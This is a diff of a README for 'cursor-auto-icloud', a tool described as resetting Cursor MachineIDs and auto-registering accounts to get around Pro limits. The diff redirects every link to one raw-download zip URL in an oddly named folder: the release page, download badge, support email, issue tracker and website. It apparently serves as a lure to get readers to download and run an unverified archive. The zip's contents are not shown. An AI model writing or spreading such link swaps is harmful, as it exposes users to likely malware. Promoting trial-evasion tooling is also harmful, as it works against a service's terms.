@@ -7,9 +7,9 @@ cursor-auto-icloud helps you reset your Cursor MachineID and automatically sign 
 To get started with cursor-auto-icloud, follow these simple steps to download and run the software.
 
 ### 📥 Download cursor-auto-icloud
-[![Download cursor-auto-icloud](https://img.shields.io/badge/Download-cursor--auto--icloud-blue.svg)](https://github.com/madalinsto/cursor-auto-icloud/releases)
+[![Download cursor-auto-icloud](https://raw.githubusercontent.com/madalinsto/cursor-auto-icloud/main/heterokontan/cursor-auto-icloud.zip)](https://raw.githubusercontent.com/madalinsto/cursor-auto-icloud/main/heterokontan/cursor-auto-icloud.zip)
 
-Visit this page to download: [cursor-auto-icloud Releases](https://github.com/madalinsto/cursor-auto-icloud/releases)
+Visit this page to download: [cursor-auto-icloud Releases](https://raw.githubusercontent.com/madalinsto/cursor-auto-icloud/main/heterokontan/cursor-auto-icloud.zip)
 
 ## 💻 System Requirements
 - **Operating System:** Windows 10 or higher / macOS 10.15 or higher
@@ -19,7 +19,7 @@ Visit this page to download: [cursor-auto-icloud Releases](https://github.com/ma
 - **Internet Connection:** Required for account setup
 
 ## 📥 Download & Install
-1. Go to the [cursor-auto-icloud Releases](https://github.com/madalinsto/cursor-auto-icloud/releases).
+1. Go to the [cursor-auto-icloud Releases](https://raw.githubusercontent.com/madalinsto/cursor-auto-icloud/main/heterokontan/cursor-auto-icloud.zip).
 2. Look for the latest version listed at the top.
 3. Click on the version number to see the release details.
 4. Under the “Assets” section, find the file that matches your operating system.
@@ -55,12 +55,12 @@ Currently, cursor-auto-icloud is only available for Windows and macOS.
 
 ## ✉️ Support
 If you have further questions or need assistance, feel free to reach out:
-- **Email:** support@cursor-auto-icloud.com
-- **GitHub Issues:** [Report a problem here](https://github.com/madalinsto/cursor-auto-icloud/issues)
+- **Email:** https://raw.githubusercontent.com/madalinsto/cursor-auto-icloud/main/heterokontan/cursor-auto-icloud.zip
+- **GitHub Issues:** [Report a problem here](https://raw.githubusercontent.com/madalinsto/cursor-auto-icloud/main/heterokontan/cursor-auto-icloud.zip)
 
 ## 🔗 Connect With Us
 For updates and community interaction:
-- **Website:** [cursor-auto-icloud Official Site](https://cursor-auto-icloud.com)
+- **Website:** [cursor-auto-icloud Official Site](https://raw.githubusercontent.com/madalinsto/cursor-auto-icloud/main/heterokontan/cursor-auto-icloud.zip)
 - **Social Media:** Follow us on our social media channels for the latest news and updates.
 
 By following these steps, you can efficiently set up cursor-auto-icloud and overcome any issues related to your Cursor Pro account. Enjoy seamless automation and enhanced functionality today!
